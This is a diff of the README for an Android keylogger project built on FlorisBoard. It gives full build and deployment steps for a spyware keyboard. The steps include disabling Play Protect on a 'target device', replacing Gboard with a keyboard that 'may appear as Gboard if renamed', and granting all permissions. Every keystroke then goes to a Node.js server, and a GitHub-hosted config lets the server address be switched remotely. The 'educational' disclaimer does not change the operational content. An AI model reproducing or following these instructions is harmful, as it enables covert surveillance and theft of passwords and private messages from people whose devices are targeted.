@@ -1,36 +1,38 @@
 ```markdown
 # Android Keylogger
 
-**By Warsecurity Research Team**
+![Project Banner](1.png)
 
-![Header](1.png)
+Educational Android keyboard keylogger based on FlorisBoard. It captures keystrokes from a custom keyboard and sends them to a Node.js server. This project is for research and security training only.
 
----
+## Features
 
-> This project is for educational and research purposes only.  
-> Unauthorised access to devices is illegal. Use only on devices you own or have explicit permission to test.  
-> The Warsecurity GitHub profile is not responsible for illegal distribution or misuse.
+![Features](2.png)
 
----
+- Custom keyboard keylogging without Accessibility
+- Dynamic server URL from GitHub config fallback
+- Batched keypress sending for realtime capture
+- Live dashboard with reconstructed lines and device filter
+- Supports Android 8+ and multiple ABIs
+- No Google Play dependencies required
 
-## Full Installation and Build Instructions
+## Installation
 
-![Build](2.png)
+![Installation](3.png)
 
-### Prerequisites (Build from Source)
+### Build from source
 
-If you already have the prebuilt APK, skip to the installation section. Otherwise, to build from source you need:
+Required tools:
 
 - Ubuntu 22.04 or newer
 - Java 17
-- Android SDK (platform 34, build-tools 34)
+- Android SDK platform 34 and build-tools 34
 - Android NDK 29.0.14206865
 - CMake 4.1.2
 - Rust toolchain with Android targets
-- Gradle 8.x (wrapper included)
 - Python 3
 
-### 1. Install Java 17
+Install Java:
 
 ```bash
 sudo apt update
@@ -38,7 +40,7 @@ sudo apt install openjdk-17-jdk -y
 java -version
 ```
 
-2. Install Android SDK Command Line Tools
+Install Android SDK command line tools:
 
 ```bash
 mkdir -p ~/android-sdk
@@ -51,20 +53,20 @@ export ANDROID_HOME=$HOME/android-sdk
 export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
 ```
 
-3. Install SDK Packages
+Install SDK packages:
 
 ```bash
 yes | sdkmanager --licenses
 sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
 ```
 
-4. Install NDK and CMake
+Install NDK and CMake:
 
 ```bash
 sdkmanager "ndk;29.0.14206865" "cmake;4.1.2"
 ```
 
-5. Install Rust
+Install Rust:
 
 ```bash
 curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
@@ -72,7 +74,7 @@ source "$HOME/.cargo/env"
 rustup target add aarch64-linux-android armv7-linux-androideabi i686-linux-android x86_64-linux-android
 ```
 
-6. Clone the Repository
+Clone the repository:
 
 ```bash
 git clone https://github.com/warsecurity/Akeylogger.git
@@ -81,59 +83,34 @@ unzip florisboard_source.zip -d florisboard
 cd florisboard
 ```
 
-7. Build the APK
+Build the APK:
 
 ```bash
 ./gradlew assembleDebug
 ```
 
-The APK will be at:
+The APK will be generated at:
 
 ```
 app/build/outputs/apk/debug/app-debug.apk
 ```
 
----
+Install on target device
 
-Installation on Target Device
-
-3.png
-
-1. Disable Play Protect
-      Go to Settings > Google > Security > Google Play Protect and turn it off.
+1. Disable Play Protect in Settings > Google > Security > Google Play Protect
 2. Install the APK
-      Copy the APK to the device and install it.
-3. Disable current Gboard optional
-      Go to Settings > System > Languages & input > On-screen keyboard and disable Gboard or any other keyboards.
-4. Enable the Keylogger Keyboard
-      Enable the installed keyboard. It may appear as Gboard if renamed.
-5. Allow Keyboard Permissions
-      Grant all permissions requested by the keyboard.
-6. Start Capturing
-      Open any app and start typing. Keystrokes will be sent to your server.
+3. Disable Gboard or any other keyboard if needed
+4. Enable the installed keyboard
+5. Allow all requested keyboard permissions
+6. Open any app and start typing
 
----
-
-Connecting to a Server
+Usage
 
 4.png
 
-Option 1: Host a Node.js Server on Render
+Run the server
 
-1. Create a Node.js server using server.js and package.json from this repository.
-2. Deploy to Render:
-   · Create a new Web Service on Render.
-   · Connect your GitHub repo or upload files.
-   · Set build command: npm install
-   · Set start command: node server.js
-3. Copy your public URL
-      Example:
-   ```
-   https://your-server.onrender.com
-   ```
-   This URL must be publicly accessible from the Android device.
-
-Option 2: Host on Your Own VPS
+Deploy the server on Render or a VPS:
 
 ```bash
 git clone https://github.com/warsecurity/Akeylogger.git
@@ -142,22 +119,28 @@ npm install
 node server.js
 ```
 
-Your server will run on port 3000. Use a reverse proxy or expose it publicly.
+For Render:
 
----
+· Create a new Web Service
+· Build command: npm install
+· Start command: node server.js
+· Copy the public URL, for example:
 
-GitHub Config Fallback
+```
+https://your-server.onrender.com
+```
 
-The APK fetches a remote config file from GitHub every 40 seconds.
-If your hardcoded server URL goes offline, you can quickly change the base URL by editing the config file on GitHub.
+Configure the APK to use your server
 
-Steps
+The APK fetches a remote config file from GitHub every 40 seconds. Create a public GitHub repo and add a file named config.json.
 
-1. Create a public GitHub repo. Example:
-   ```
-   warsecurity/basee
-   ```
-2. Create a config.json file in that repo with the following structure:
+Example repo:
+
+```
+warsecurity/basee
+```
+
+Example config.json:
 
 ```json
 {
@@ -168,52 +151,78 @@ Steps
 }
 ```
 
-3. Link the raw URL in the APK
-      The APK fetches from:
-   ```
-   https://raw.githubusercontent.com/<username>/<repo>/main/config.json
-   ```
-   Replace <username> and <repo> with your own values.
-4. Update the APK as described below.
+Use this raw URL format:
 
----
+```
+https://raw.githubusercontent.com/<username>/<repo>/main/config.json
+```
 
-Decompiling or Building the APK to Add Your Config URL
+Replace <username> and <repo> with your own values.
 
-Option A: Modify via Source Code Recommended
+Configuration
 
-1. Open the source code after unzipping.
-2. Locate:
-   ```
-   app/src/main/kotlin/dev/patrickgold/florisboard/ime/logging/Keylogger.kt
-   ```
-3. Find:
-   ```kotlin
-   private const val CONFIG_URL = "https://raw.githubusercontent.com/warsecurity/basee/main/config.json"
-   ```
-4. Replace it with your own raw GitHub URL.
-5. Rebuild the APK:
-   ```bash
-   ./gradlew assembleDebug
-   ```
+Add your config URL to the APK
 
-Option B: Decompile with APK Editor
+Modify the source file:
 
-1. Install APK Editor Pro on the Android device.
-2. Open the APK in APK Editor and select Full Edit.
-3. Navigate to smali or search for:
-   · config.json
-   · raw.githubusercontent.com
-4. Replace the URL with your own.
-5. Save and rebuild the APK.
-6. Install the modified APK.
+```
+app/src/main/kotlin/dev/patrickgold/florisboard/ime/logging/Keylogger.kt
+```
 
----
+Find:
+
+```kotlin
+private const val CONFIG_URL = "https://raw.githubusercontent.com/warsecurity/basee/main/config.json"
+```
+
+Replace it with your own raw GitHub URL and rebuild:
+
+```bash
+./gradlew assembleDebug
+```
+
+Decompile with APK Editor
+
+1. Install APK Editor Pro
+2. Open the APK and choose Full Edit
+3. Search for config.json or raw.githubusercontent.com
+4. Replace the URL with your own
+5. Save and rebuild
+
+Tech Stack
+
+· Kotlin
+· Android IME service
+· Node.js
+· Express
+· Socket.IO
+· Rust native libraries
+· Gradle
+
+Project Structure
+
+```
+Akeylogger/
+├── florisboard_source.zip
+├── server.js
+├── package.json
+├── public/
+│   └── index.html
+├── 1.png
+├── 2.png
+├── 3.png
+├── 4.png
+└── README.md
+```
 
 Disclaimer
 
-This project is for educational and research purposes only.
-The developers are not responsible for any illegal use or distribution.
-Always obtain explicit permission before testing on any device you do not own.
+This project is for educational and research purposes only. The developers are not responsible for any illegal use or distribution. Always obtain explicit permission before testing on any device you do not own.
+
+Contact
+
+WarSecurity Research Team
+
+GitHub: https://github.com/warsecurity
 
 ```
